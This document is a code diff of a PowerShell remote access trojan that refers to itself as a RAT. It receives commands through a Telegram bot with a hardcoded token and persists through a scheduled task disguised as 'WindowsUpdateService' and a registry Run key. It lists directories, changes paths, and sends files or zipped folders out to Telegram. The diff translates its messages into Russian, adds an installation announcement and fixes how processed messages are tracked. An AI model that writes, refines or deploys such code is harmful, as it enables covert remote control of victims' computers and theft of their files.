@@ -10,12 +10,14 @@ function Decode-String {
 
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
-$CurrentPath = $pwd.Path
 $BotURL = "https://api.telegram.org/bot$Token/"
 
 $ScriptPath = $MyInvocation.MyCommand.Path
 $TaskName = "WindowsUpdateService"
 $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+
+# Глобальная переменная для текущей директории
+$Global:CurrentDirectory = $pwd.Path
 
 function Send-Telegram {
     param([string]$Text, [string]$FilePath = $null)
@@ -80,37 +82,41 @@ function Process-Command {
     
     switch ($Command) {
         "/help" {
-            $HelpText = @"
-Available commands:
-/help - Show this help
-/ls [path] - List directory contents
-/cd [path] - Change directory
-/download [path] - Download file or folder
-/selfdestruct - Remove RAT and persistence
-"@
+            $HelpText = "Доступные команды:
+/help - Показать этот список
+/ls [путь] - Список файлов в директории
+/cd [путь] - Сменить директорию
+/download [путь] - Скачать файл или папку
+/selfdestruct - Самоуничтожение RAT"
             Send-Telegram -Text $HelpText
         }
         "/ls" {
-            $TargetPath = if ($Args) { $Args } else { $CurrentPath }
+            $TargetPath = if ($Args) { $Args } else { $Global:CurrentDirectory }
             try {
                 $Items = Get-ChildItem -Path $TargetPath -Force | Select-Object Name, Length, LastWriteTime
-                $Result = $Items | ForEach-Object { 
-                    $Type = if ($_.PSIsContainer) { "DIR" } else { "FILE" }
-                    "$Type - $($_.Name) - $($_.Length) bytes - $($_.LastWriteTime)"
+                $Result = @()
+                foreach ($Item in $Items) {
+                    $Type = if ($Item.PSIsContainer) { "DIR" } else { "FILE" }
+                    $Size = if ($Item.Length) { "$($Item.Length) bytes" } else { "0 bytes" }
+                    $Result += "$Type - $($Item.Name) - $Size - $($Item.LastWriteTime)"
                 }
                 Send-Telegram -Text ($Result -join "`n")
             } catch {
-                Send-Telegram -Text "Error listing directory"
+                Send-Telegram -Text "Ошибка при получении списка файлов"
             }
         }
         "/cd" {
             if ($Args) {
                 try {
-                    Set-Location $Args
-                    $CurrentPath = $pwd.Path
-                    Send-Telegram -Text "Directory changed to: $CurrentPath"
+                    $NewPath = Join-Path $Global:CurrentDirectory $Args
+                    if (Test-Path $NewPath -PathType Container) {
+                        $Global:CurrentDirectory = $NewPath
+                        Send-Telegram -Text "Директория изменена на: $Global:CurrentDirectory"
+                    } else {
+                        Send-Telegram -Text "Директория не найдена: $Args"
+                    }
                 } catch {
-                    Send-Telegram -Text "Error changing directory"
+                    Send-Telegram -Text "Ошибка при смене директории"
                 }
             }
         }
@@ -120,32 +126,49 @@ Available commands:
                 if ($item.PSIsContainer) {
                     $ZipPath = Compress-Folder -FolderPath $Args
                     if ($ZipPath) {
-                        Send-Telegram -Text "Folder compressed" -FilePath $ZipPath
+                        Send-Telegram -Text "Папка заархивирована" -FilePath $ZipPath
                         Remove-Item $ZipPath -Force
                     }
                 } else {
-                    Send-Telegram -Text "File download" -FilePath $Args
+                    Send-Telegram -Text "Файл отправлен" -FilePath $Args
                 }
+            } else {
+                Send-Telegram -Text "Файл или папка не найдены"
             }
         }
         "/selfdestruct" {
-            Send-Telegram -Text "Self destruction initiated"
+            Send-Telegram -Text "Самоуничтожение активировано"
             SelfDestruct
         }
     }
 }
 
+function Send-StartupMessage {
+    $StartupMessage = "RAT УСПЕШНО УСТАНОВЛЕН
+
+Доступные команды:
+/help - Показать список команд
+/ls - Список файлов в директории  
+/cd - Сменить директорию
+/download - Скачать файл или папку
+/selfdestruct - Самоуничтожение RAT"
+    
+    Send-Telegram -Text $StartupMessage
+}
+
 try {
     if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
         Install-Persistence
-        Send-Telegram -Text "System initialized - use /help for commands"
+        Send-StartupMessage
     }
 
     while ($true) {
         try {
             $Updates = Invoke-RestMethod -Uri ($BotURL + "getUpdates") -Method Get
             if ($Updates.ok -and $Updates.result) {
+                $LastUpdateID = 0
                 foreach ($Update in $Updates.result) {
+                    $LastUpdateID = $Update.update_id
                     $Message = $Update.message
                     if ($Message -and $Message.chat.id -eq [int64]$ChatID) {
                         $Text = $Message.text
@@ -156,6 +179,11 @@ try {
                             Process-Command -Command $Command -Args $Args
                         }
                     }
+                }
+                # Отмечаем обработанные сообщения
+                if ($LastUpdateID -gt 0) {
+                    $Body = @{ offset = $LastUpdateID + 1 }
+                    Invoke-RestMethod -Uri ($BotURL + "getUpdates") -Method Post -Body $Body | Out-Null
                 }
             }
         } catch { }
